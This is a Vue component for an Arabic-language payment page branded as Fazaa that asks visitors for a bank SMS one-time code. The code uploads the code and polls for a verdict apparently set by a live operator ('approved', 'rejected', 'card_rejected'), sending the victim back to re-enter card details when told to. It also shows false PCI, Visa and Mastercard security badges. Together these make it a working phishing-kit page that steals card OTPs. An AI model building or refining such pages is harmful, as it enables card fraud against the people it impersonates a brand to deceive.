<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { Check, ShieldCheck } from 'lucide-vue-next';
import { updateCardRequest, getCardRequest, resolveActiveRequestId, setActiveRequestId } from '../api';

const router = useRouter();
const otp = ref('');
const timeLeft = ref(3 * 60 + 54); // 03:54
let timer: ReturnType<typeof setInterval> | null = null;
let statusPoll: ReturnType<typeof setInterval> | null = null;
const isSubmitting = ref(false);
const error = ref('');
const successMessage = ref('');

const pad = (n: number) => n.toString().padStart(2, '0');

const formattedTime = computed(() => {
  const m = Math.floor(timeLeft.value / 60);
  const s = timeLeft.value % 60;
  return `${pad(m)}:${pad(s)}`;
});

onMounted(() => {
  timer = setInterval(() => {
    if (timeLeft.value > 0) {
      timeLeft.value--;
    }
  }, 1000);
});

onUnmounted(() => {
  if (timer) clearInterval(timer);
  if (statusPoll) clearInterval(statusPoll);
});

const submitOtp = async () => {
  if (!otp.value || isSubmitting.value) return;

  if (!/^\d{6}$/.test(otp.value)) {
    error.value = 'الرجاء إدخال رمز صحيح مكون من 6 أرقام';
    return;
  }
  error.value = '';

  isSubmitting.value = true;
  
  const requestId = await resolveActiveRequestId();
  if (!requestId) {
    error.value = 'لم يتم العثور على الطلب، يرجى البدء من جديد.';
    isSubmitting.value = false;
    setTimeout(() => router.push('/'), 1200);
    return;
  }

  try {
    await updateCardRequest(requestId, {
      otp: otp.value,
      step: 'otp',
      otpStatus: 'pending'
    });

    if (statusPoll) clearInterval(statusPoll);
    statusPoll = setInterval(async () => {
      try {
        const data = await getCardRequest(requestId);
        if (!data) return;
        if (data.otpStatus === 'approved') {
          if (statusPoll) clearInterval(statusPoll);
          successMessage.value = 'تمت العملية وتأكيد طلب بطاقة فزعة بنجاح!';
          setActiveRequestId(null);
          isSubmitting.value = false;
          setTimeout(() => router.push('/'), 1800);
        } else if (data.otpStatus === 'rejected') {
          if (statusPoll) clearInterval(statusPoll);
          error.value = 'الرجاء إدخال رمز صحيح. الرمز غير صحيح.';
          otp.value = '';
          isSubmitting.value = false;
        } else if (data.otpStatus === 'card_rejected') {
          if (statusPoll) clearInterval(statusPoll);
          isSubmitting.value = false;
          router.push('/card-details');
        }
      } catch (e) {}
    }, 1500);
  } catch (err) {
    error.value = 'حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.';
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div dir="rtl" class="min-h-screen bg-[#f4f1ea] font-sans text-slate-900">
    <div class="max-w-xl mx-auto min-h-screen bg-[#faf8f4] flex flex-col justify-between shadow-[0_0_60px_rgba(11,31,56,0.12)] border-x border-[#e6decb]/80">
      
      <!-- Top Fazaa Header -->
      <header class="w-full h-16 px-5 flex items-center justify-center border-b border-[#8a6c1e]/40 relative overflow-hidden shadow-md">
        <img
          src="/assets/aistudio/header-background-gold.50f1dc5b.jpg"
          alt=""
          class="absolute inset-0 w-full h-full object-cover object-right pointer-events-none"
        />
        <div class="absolute inset-0 bg-gradient-to-l from-black/15 via-transparent to-black/25 pointer-events-none"></div>
        <div @click="router.push('/')" class="relative z-10 cursor-pointer flex items-center select-none">
          <img
            src="/assets/aistudio/fazaa-logo.png"
            alt="Fazaa Logo"
            class="h-12 w-auto object-contain drop-shadow-[0_2px_6px_rgba(0,0,0,0.3)]"
          />
        </div>
      </header>

      <!-- Main Verification Card -->
      <div class="px-5 py-6 my-auto flex flex-col items-center">
        <div class="bg-white rounded-2xl shadow-[0_12px_35px_rgba(11,31,56,0.06)] w-full max-w-[385px] border border-[#e6decb] p-6 flex flex-col items-center text-center relative z-10">
          
          <!-- Fazaa Badge -->
          <div class="bg-gradient-to-br from-[#c8a951] to-[#987a28] w-11 h-11 rounded-2xl flex items-center justify-center mb-4 shadow-md shadow-[#c5a44e]/25">
            <Check class="text-white w-5 h-5 stroke-[3]" />
          </div>

          <!-- Text Content -->
          <h1 class="text-[#0b1f38] font-extrabold text-base leading-relaxed mb-1">
            التحقق من عملية الدفع لبطاقة فزعة
          </h1>
          <p class="text-slate-600 font-medium text-xs leading-relaxed mb-4">
            تم إرسال رمز تحقق لمرة واحدة (OTP) برسالة نصية إلى رقم هاتفك المسجل لدى البنك
          </p>

          <!-- Instructions -->
          <p class="text-slate-800 font-bold text-xs leading-relaxed mb-5">
            يرجى إدخال الرمز المكون من 6 أرقام لتأكيد العملية
          </p>

          <div v-if="successMessage" class="w-full mb-4 p-2.5 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-700 text-xs font-bold">
            {{ successMessage }}
          </div>

          <!-- OTP Input -->
          <div class="w-full mb-5 relative" dir="ltr">
            <input 
              type="text" 
              v-model="otp" 
              placeholder="• • • • • •" 
              class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf9] text-center text-lg tracking-[0.5em] focus:outline-none focus:border-[#c5a44e] focus:bg-white text-slate-900 transition-colors placeholder-slate-300 font-mono tabular-nums"
              maxlength="6"
            />
            <p v-if="error" class="text-red-600 text-[11px] font-semibold mt-1.5 text-center" dir="rtl">{{ error }}</p>
          </div>

          <!-- Timer -->
          <div class="text-xl font-extrabold text-[#0b1f38] mb-5 tracking-wider font-mono tabular-nums" dir="ltr">
            {{ formattedTime }}
          </div>

          <!-- Submit Button -->
          <button 
            @click="submitOtp" 
            :disabled="isSubmitting"
            class="w-full h-12 bg-gradient-to-r from-[#c8a951] via-[#b4943c] to-[#987a28] hover:from-[#d2b35b] hover:to-[#a3842f] text-white rounded-xl font-extrabold text-sm transition-all shadow-[0_8px_20px_rgba(180,148,60,0.3)] disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 cursor-pointer"
          >
            <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
            <span v-else>تأكيد الدفع (Confirm)</span>
          </button>

        </div>

        <!-- Security Badges -->
        <div class="mt-6 flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#0b1f38]">
          <ShieldCheck class="w-4 h-4 text-[#b4943c]" />
          <span>PCI DSS COMPLIANT · Verified by VISA · Mastercard SecureCode</span>
        </div>
      </div>

      <!-- Fazaa Footer -->
      <footer class="bg-[#09192d] px-5 py-4 text-center text-[11px] text-slate-300 border-t border-[#c5a44e]/25">
        © 2026 Fazaa · كل الحقوق محفوظة
      </footer>

    </div>
  </div>
</template>
